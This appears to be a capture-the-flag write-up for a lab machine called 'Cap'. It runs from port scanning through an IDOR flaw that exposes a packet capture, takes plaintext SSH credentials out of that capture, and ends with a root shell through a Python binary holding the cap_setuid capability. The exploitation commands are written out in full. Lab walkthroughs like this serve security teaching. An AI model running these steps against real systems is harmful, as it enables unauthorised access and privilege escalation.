##### Tags: `gunicorn`  `IDOR`  `Wireshark`  `SUID`

# 🐧Cap🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 10.129.244.181

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is web service running gunicorn
```console
$ curl -i http://10.129.244.181           
HTTP/1.1 200 OK
Server: gunicorn
Date: Mon, 03 Aug 2026 11:46:32 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 19386
```
when we click security snapshot on the webpage  
it redirect us to http://10.129.244.181/data/1 but returns 0 output  
we changed 1 to 0 and  got some result we can download
```console
http://10.129.244.181/data/0

file name: 0.pcap
```
it is a Packet Capture file we can use Wireshark to analyse  
we use strings filter function with keyword "user" "pass"  
we got the credential nathan:Buck3tH4TF0RM3!
```console
user: nathan
pass: Buck3tH4TF0RM3!
```
ssh as nathan
```
$ ssh nathan@10.129.244.181
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```
## Privilege Escalation
python3.8 has cap_setuid capabilities  
which Allows the binary to change its user ID (UID), meaning we can switch to the root user (UID 0).
```console
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
got the root shell
```console
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")' 
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```
